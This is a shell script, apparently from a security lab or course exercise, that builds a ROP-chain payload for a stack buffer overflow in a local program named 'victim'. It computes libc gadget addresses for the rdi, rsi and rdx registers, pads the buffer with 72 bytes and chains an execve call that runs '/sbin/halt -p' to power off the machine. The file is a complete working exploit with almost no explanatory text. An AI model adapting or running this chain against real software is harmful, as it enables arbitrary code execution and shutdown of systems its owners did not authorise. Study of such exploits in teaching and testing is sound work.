#!/bin/sh

# libc /lib/x86_64-linux-gnu/libc.so.6

# address of buffer:
# 	0x7fffffffde40 for gdb victim
# 	0x7fffffffded0 for ./victim, 

# offset of libc:


# rdi, rsi, rdx
# /sbin/halt -p Null

# offset of execve
# 0x00000000000150db using ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "execve"
# 00000000000e4e30 using nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep execve

addr_buff="0x00007fffffffde20"
addr_libc="0x00007ffff79e4000"

filename="/sbin///////halt"
arg1="-p"

# Init syscall arguments gadgets
offset_rdi="0x2155f"
offset_rsi="0x23e6a"
offset_rdx=" 0x1b96"
offset_execve="0x00000000000e4e30"

null="0000000000000000"

echo -n "$filename" > tmp
filename_hex="$(xxd -p -l32 tmp | head -c 32)"
echo -n "$arg1" > tmp
arg1_hex="$(xxd -p -l4 tmp | head -c 4)"
rm tmp

addr_rdi=$( printf "%016x" $(($addr_libc + $offset_rdi)) | tac -rs..)
addr_rsi=$( printf "%016x" $(($addr_libc + $offset_rsi)) | tac -rs.. )
addr_rdx=$( printf "%016x" $(($addr_libc + $offset_rdx)) | tac -rs.. )
addr_execve=$( printf "%016x" $(($addr_libc + $offset_execve)) | tac -rs.. )

addr_filename=$( printf "%016x" $(($addr_buff + 64+8+ 10*8)) | tac -rs.. )
addr_arg1=$( printf "%016x" $(($addr_buff + 64+8+ 13*8)) | tac -rs.. )
addr_addr_args=$( printf "%016x" $(($addr_buff + 64+8+ 7*8)) | tac -rs.. )

padding_buff="$(python3 -c 'print("90"*72)')"

echo "addr_buff $addr_buff"
echo "addr_libc $addr_libc"
echo "addr_rdi $(echo -n "$addr_rdi" | tac -rs..)"
echo "addr_filename $(echo -n "$addr_filename" | tac -rs..)"
echo "addr_rsi $(echo -n "$addr_rsi" | tac -rs..)"
echo "addr_addr_args $(echo -n "$addr_addr_args" | tac -rs..)"
echo "addr_rdx $(echo -n "$addr_rdx" | tac -rs..)"
echo "addr_execve $(echo -n "$addr_execve" | tac -rs..)"
echo "addr_arg1 $(echo -n "$addr_arg1" | tac -rs..)"
echo "filename_hex $(echo -n "$filename_hex")"
echo "arg1_hex $(echo -n "$arg1_hex")"

rm input_hex input

echo -n "$padding_buff" >> input_hex
echo -n "$addr_rdi" >> input_hex
echo -n "$addr_filename" >> input_hex
echo -n "$addr_rsi" >> input_hex
echo -n "$addr_addr_args" >> input_hex
echo -n "$addr_rdx" >> input_hex
echo -n "$null" >> input_hex
echo -n "$addr_execve" >> input_hex
echo -n "$addr_filename" >> input_hex
echo -n "$addr_arg1" >> input_hex
echo -n "$null" >> input_hex
echo -n "$filename_hex" >> input_hex
echo -n "$null" >> input_hex
echo -n "$arg1_hex" >> input_hex
echo -n "$null" >> input_hex

xxd -r -p input_hex input